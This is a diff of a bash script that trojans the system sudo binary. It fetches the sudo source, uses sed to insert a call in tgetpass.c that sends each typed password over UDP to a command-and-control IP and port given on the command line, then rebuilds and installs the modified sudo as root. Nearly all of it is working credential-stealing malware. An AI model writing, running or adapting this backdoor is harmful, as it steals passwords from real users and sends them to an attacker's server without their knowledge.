@@ -1,19 +1,37 @@
 #!/bin/bash
 
+if [[ $(/usr/bin/id -u) -ne 0 ]]; then
+    echo "Script must be run as root"
+    exit
+fi
+
+if [ "$1" = "" ] || [ "$2" = "" ]
+then
+  echo "Usage: sudo $0 <C2 IP> <Port>"
+  exit
+fi
+
+
+apt-get install -y make unzip
+
 SUDO_VERSION=`sudo -V | grep "Sudo version" | cut -d " " -f 3 | tr '.' '_'`
 
-# wget "https://codeload.github.com/sudo-project/sudo/zip/refs/tags/SUDO_$SUDO_VERSION"
-# unzip "SUDO_$SUDO_VERSION"
+wget "https://codeload.github.com/sudo-project/sudo/zip/refs/tags/SUDO_$SUDO_VERSION"
+unzip "SUDO_$SUDO_VERSION"
+rm -r "SUDO_$SUDO_VERSION"
 
-PAYLOAD="udpSend(pass);"
+DEST_IP=$1
+PORT=$2
+dir="sudo-SUDO_$SUDO_VERSION/src/tgetpass.c"
 
+PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\");"
 match='pass = getln(input, buf, sizeof(buf), feedback, &errval);'
-file='tgetpass.c'
 
-sed -i "/$match/a$PAYLOAD" tgetpass.c
+sed -i "/$match/a$PAYLOAD" $dir
+sed -i '/\#include \"sudo.h\"/rsudowudo.c' $dir
 
-# Need to write a patcher - also fix creation date/time
+cd sudo-SUDO_$SUDO_VERSION
 
-# cd sudo && /configure
-
-# cd sudo && make && make install
+./configure
+make && make install
+cd ../ && rm -r sudo-SUDO_$SUDO_VERSION
